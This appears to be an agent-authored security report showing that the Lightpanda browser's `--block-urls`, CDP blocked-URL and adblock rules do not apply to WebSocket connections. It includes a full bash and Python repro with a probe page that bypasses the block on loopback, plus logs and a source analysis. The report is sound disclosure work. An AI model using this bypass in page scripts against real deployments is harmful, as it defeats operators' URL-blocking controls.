(authored by agents unless marked 🧑)

> SECURITY.md (project instruction): "Please **DO NOT** file a public issue, instead send your report privately to security@lightpanda.io."

## Title

`--block-urls` is not applied to `new WebSocket()`

## Version

- `lightpanda version`: `1.1.0-nightly.11647+b8e234a77`
- Nightly x86_64-linux binary from `https://github.com/lightpanda-io/browser/releases/download/nightly/lightpanda-x86_64-linux` (downloaded 2026-11-04), sha256 `e7ed89bddaadf3da70d2e6092b498181d66a45fcd07353302c0c2724f668e16e`
- Source commit `b8e234a77259283ff2653d5cc5900249d1d2cea9`
- Source inspected at main `61378ecba945b92d9ab8dfacb649a3de73eafa59` (2026-11-04): `WebSocket.connect` still bypasses the HTTP pipeline's URL/adblock check. Main was not built; the repro ran on the nightly above, which is the latest nightly as of 2026-11-04. Links below are pinned to the earlier main commit `d4ad6b07`; in `61378ecb` the files were edited (line numbers shifted, and `isBlockedPort` became `http.isBadPortUrl`), but `WebSocket.connect` still has no `isUrlBlocked` check.

## Summary

A URL matched by `--block-urls` is refused for fetch, but a page can still open a WebSocket to it. The upgrade reaches the blocked server, the handshake completes (101), and the page receives the server's message. `--block-cidrs` does block the WebSocket.

## Repro

Self-contained script: needs bash, python3, curl, and Linux (it relies on `127.0.0.2` being a loopback address; not available by default on macOS). It downloads the nightly (whose checksum changes when a new nightly is published), writes a minimal HTTP+WebSocket server and a probe page, runs a no-block control and a `--block-urls` run, and prints each server's log. Save as `repro.sh` and run `bash repro.sh` in an empty directory.

The server logs every request, answers HTTP with `Access-Control-Allow-Origin: *` (so the cross-origin fetch is readable in the control) and body `secret-from-<port><path>`, and for a WebSocket upgrade completes the RFC 6455 handshake, sends one text frame `hello-from-<port>`, and closes TCP after 1 s.

````bash
#!/usr/bin/env bash
set -u
cd "$(dirname "$0")"
[ -x ./lightpanda ] || { curl -sSL -o lightpanda https://github.com/lightpanda-io/browser/releases/download/nightly/lightpanda-x86_64-linux && chmod +x lightpanda; }
sha256sum lightpanda; ./lightpanda version
mkdir -p www

cat > srv.py <<'EOF'
# minimal threaded HTTP + WebSocket server that logs every request it receives.
# usage: python3 -I srv.py <port> <docroot>
import base64, hashlib, os, socket, sys, threading, time, urllib.parse

PORT = int(sys.argv[1]); ROOT = sys.argv[2]; HOST = sys.argv[3] if len(sys.argv) > 3 else "127.0.0.1"
GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def log(msg):
    print(f"[{PORT} {time.strftime('%H:%M:%S')}] {msg}", flush=True)

def resp(c, status, headers, body=b""):
    h = f"HTTP/1.1 {status}\r\n" + "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    h += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    c.sendall(h.encode() + body)

def ws_frame(payload):
    n = len(payload)
    assert n < 126
    return bytes([0x81, n]) + payload

def handle(c):
    try:
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = c.recv(4096)
            if not chunk: return
            data += chunk
        head = data.split(b"\r\n\r\n", 1)[0].decode("latin1")
        lines = head.split("\r\n")
        method, target, _ = lines[0].split(" ", 2)
        hdrs = {l.split(":", 1)[0].strip().lower(): l.split(":", 1)[1].strip() for l in lines[1:] if ":" in l}
        upgrade = hdrs.get("upgrade", "").lower() == "websocket"
        log(f"{method} {target} upgrade={upgrade} origin={hdrs.get('origin','-')}")
        u = urllib.parse.urlsplit(target); q = urllib.parse.parse_qs(u.query)
        cors = {"Access-Control-Allow-Origin": "*"}
        if upgrade:
            acc = base64.b64encode(hashlib.sha1(hdrs["sec-websocket-key"].encode() + GUID).digest()).decode()
            c.sendall(("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                       f"Sec-WebSocket-Accept: {acc}\r\n\r\n").encode())
            log("ws handshake completed (101 sent)")
            c.sendall(ws_frame(f"hello-from-{PORT}".encode()))
            time.sleep(1.0)
            return
        if u.path == "/redir":
            resp(c, f"{q.get('code',['302'])[0]} Redirect", {**cors, "Location": q["to"][0]})
            return
        p = os.path.join(ROOT, u.path.lstrip("/") or "index.html")
        if os.path.isfile(p):
            ctype = "text/html" if p.endswith(".html") else "application/javascript" if p.endswith(".js") else "text/plain"
            resp(c, "200 OK", {**cors, "Content-Type": ctype}, open(p, "rb").read())
        else:
            resp(c, "200 OK", {**cors, "Content-Type": "text/plain"}, f"secret-from-{PORT}{u.path}".encode())
    except Exception as e:
        log(f"error {e!r}")
    finally:
        c.close()

s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT)); s.listen(64); log("listening")
while True:
    c, _ = s.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
EOF

cat > www/probe.html <<'EOF'
<pre id="out"></pre><script>
const r={};
(async()=>{
try{r.fetch=await (await fetch('http://127.0.0.2:18103/f')).text()}catch(e){r.fetch='exception: '+e}
await new Promise(res=>{
  let w;
  try{w=new WebSocket('ws://127.0.0.2:18103/ws')}catch(e){r.ws='constructor exception: '+e;return res()}
  w.onmessage=e=>{r.ws='message: '+e.data;res()};
  w.onerror=()=>{r.ws='error event';res()};
  setTimeout(()=>{r.ws??='timeout';res()},1500);
});
document.getElementById('out').textContent=JSON.stringify(r);
})();</script>
EOF

python3 -I srv.py 18101 "$PWD/www" 127.0.0.1 >> srv18101.log 2>&1 & P1=$!
python3 -I srv.py 18103 "$PWD/www" 127.0.0.2 >> srv18103.log 2>&1 & P3=$!
trap 'kill $P1 $P3 2>/dev/null' EXIT
for f in srv18101.log srv18103.log; do for i in $(seq 50); do grep -q listening $f && break; sleep 0.1; done; grep -q listening $f || { echo "server failed: $f"; cat $f; exit 1; }; done

run() {
  echo "== $1"; : > srv18103.log
  shift
  ./lightpanda fetch --log-level info "$@" --wait-until done --wait-ms 5000 \
    --dump-selector '#out' --dump html http://127.0.0.1:18101/probe.html 2> lp.log
  echo "-- lightpanda stderr lines mentioning block:"; grep -i -e block -e websocket lp.log; echo
  echo "-- 18103 server log:"; cat srv18103.log
}
export TELEMETRY_OFF=1 LIGHTPANDA_DISABLE_TELEMETRY=true
run "control (no blocking)"
run "--block-urls" --block-urls '*127.0.0.2:18103*'
````

## Expected

With `--block-urls '*127.0.0.2:18103*'`, no request reaches the 18103 server, and the WebSocket cannot open or receive application data.

## Actual

Output of `bash repro.sh` (2026-11-04, x86_64 Linux 5.15; `$time=` prefixes removed, reproduced on a second run):

```
== control (no blocking)
<pre id="out">{"fetch":"secret-from-18103/f","ws":"message: hello-from-18103"}</pre>
-- 18103 server log:
[18103 07:09:36] GET /f upgrade=False origin=http://127.0.0.1:18101
[18103 07:09:36] GET /ws upgrade=True origin=http://127.0.0.1:18101
[18103 07:09:36] ws handshake completed (101 sent)
== --block-urls
<pre id="out">{"fetch":"exception: TypeError: fetch error","ws":"message: hello-from-18103"}</pre>
-- lightpanda stderr lines mentioning block:
$scope=http $level=info $msg="blocked url" $page=1 url=http://127.0.0.2:18103/f
$scope=http $level=info $msg="request error" $page=1 source=fetch url=http://127.0.0.2:18103/f status=0 err=UrlBlocked
$scope=websocket $level=info $msg="connected" url=ws://127.0.0.2:18103/ws
$scope=websocket $level=info $msg="disconnected" $page=1 url=ws://127.0.0.2:18103/ws reason=closed
-- 18103 server log:
[18103 07:09:37] GET /ws upgrade=True origin=http://127.0.0.1:18101
[18103 07:09:37] ws handshake completed (101 sent)
```

The fetch is refused by policy (`err=UrlBlocked`, and the 18103 server sees no `GET /f`), while the WebSocket upgrade reaches the blocked server and the page receives its message.

## Other observations

These were observed in separate runs; their reproduction steps are not included here.

- Pattern choice is not the cause: `--block-urls 'ws://127.0.0.2:18103/*'` still let the WebSocket through (HTTP also passed, as expected, since that pattern does not match `http://`).
- CDP `Network.setBlockedURLs` with `"urlPatterns":[{"urlPattern":"*127.0.0.2:18103*","block":true}]`: HTTP blocked, WebSocket received data.
- `--adblock-lists` with a plain filter containing `127.0.0.2:18103`: HTTP blocked, WebSocket received data.
- `--block-cidrs 127.0.0.2/32`: HTTP blocked and the WebSocket got an error event.

## Likely cause (from reading the source)

- [`HttpClient.isUrlBlocked`](https://github.com/lightpanda-io/browser/blob/d4ad6b07eb096adb2343c7a59eeb9e79d2f95cf0/src/network/HttpClient.zig#L434) is documented as "Every reason a request is refused before it reaches the network: `--block-urls` patterns and the `--adblock-lists` filters both land here so that no call site can apply one without the other." It is called from the `.after_intercept` stage of the HTTP pipeline (line 1132).
- [`WebSocket.connect`](https://github.com/lightpanda-io/browser/blob/d4ad6b07eb096adb2343c7a59eeb9e79d2f95cf0/src/browser/webapi/net/WebSocket.zig#L235) checks only `isBlockedPort`, then calls `http_client.network.newConnection()`, `conn.setURL(resolved_url)`, and `http_client.trackConn(conn)`. It creates no `Transfer` and never enters the pipeline; `trackConn` (HttpClient.zig at `d4ad6b07`, line 2101) does no block check.
- `--block-cidrs` works because the IP filter is installed as an opensocket callback on every connection ([`http.zig`](https://github.com/lightpanda-io/browser/blob/d4ad6b07eb096adb2343c7a59eeb9e79d2f95cf0/src/network/http.zig#L547)), and [`Network.newConnection`](https://github.com/lightpanda-io/browser/blob/d4ad6b07eb096adb2343c7a59eeb9e79d2f95cf0/src/network/Network.zig#L206) passes it in.

Suggested fix direction (opinion): run the same `isUrlBlocked` check in `WebSocket.connect` before `newConnection`, using the `ws`/`wss` URL or its mapped `http`/`https` form. Which form patterns should match is a maintainer decision.

## Impact (limited)

Anyone using `--block-urls` (and, per the earlier observations, `Network.setBlockedURLs` or adblock lists) to deny an origin can be bypassed by page JS using WebSocket. Observed: the upgrade request goes out and application data comes back. `WebSocket.send` with an application payload was not tested. `--block-cidrs` is a workaround for IP-based rules only; it cannot block by hostname.

## Not tested

- `wss://`, WebSocket from Workers, a WebSocket upgrade receiving a 3xx.
- `--block-private-networks` for WebSocket (shares the CIDR mechanism in source; not executed).
- Other builds/platforms; loopback plain HTTP/WS only.
- Whether this is intended behavior; docs and comments say nothing about WebSocket.
